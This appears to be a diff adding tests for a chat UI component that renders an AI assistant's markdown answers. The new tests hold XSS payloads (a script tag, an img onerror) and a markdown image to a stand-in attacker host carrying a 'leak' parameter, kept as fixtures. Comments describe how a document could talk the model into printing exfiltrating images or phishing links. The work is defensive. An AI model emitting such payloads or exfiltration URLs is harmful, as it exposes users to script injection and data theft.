@@ -301,6 +301,62 @@ describe("ChatMessage", () => {
     expect(status).not.toHaveClass("border-danger-line");
   });
 
+  it("renders an assistant answer's bold and lists as formatting, not literal markers", () => {
+    const { container } = render(
+      <ChatMessage
+        message={assistant({
+          text: "Two options:\n\n1. **Honda CR-V** - 4,200\n2. *Subaru Forester* - 5,900",
+        })}
+      />,
+    );
+    expect(container.querySelector("strong")).toHaveTextContent("Honda CR-V");
+    expect(container.querySelector("em")).toHaveTextContent("Subaru Forester");
+    expect(container.querySelectorAll("ol > li")).toHaveLength(2);
+    expect(container).not.toHaveTextContent("**");
+  });
+
+  it("keeps raw HTML in an assistant answer as literal text, never markup", () => {
+    // The answer can quote an uploaded document or the visitor's own words,
+    // so the markdown pass must not turn embedded HTML into elements.
+    const { container } = render(
+      <ChatMessage
+        message={assistant({
+          text: 'See <script>alert(1)</script> and <img src="x" onerror="alert(2)">',
+        })}
+      />,
+    );
+    expect(container).toHaveTextContent("<script>alert(1)</script>");
+    expect(container.querySelector("script")).toBeNull();
+    expect(container.querySelector("img")).toBeNull();
+  });
+
+  it("drops a markdown image and does not make links clickable", () => {
+    // An image would make the visitor's browser fetch a URL the model chose
+    // (a data-exfiltration channel); a link could be a phishing target a
+    // document talked the model into printing.
+    const { container } = render(
+      <ChatMessage
+        message={assistant({
+          text:
+            "![pixel](https://evil.example/p.png?leak=1) " +
+            "[claim prize](javascript:alert(1)) [site](https://evil.example)",
+        })}
+      />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("a")).toBeNull();
+    expect(container).toHaveTextContent("claim prize");
+    expect(container).toHaveTextContent("site");
+  });
+
+  it("keeps a user message as plain text, markers and all", () => {
+    const { container } = render(
+      <ChatMessage message={assistant({ role: "user", text: "is **this** bold?" })} />,
+    );
+    expect(screen.getByText("is **this** bold?")).toBeInTheDocument();
+    expect(container.querySelector("strong")).toBeNull();
+  });
+
   it("shows a turn error as an alert while keeping the partial text", () => {
     render(
       <ChatMessage
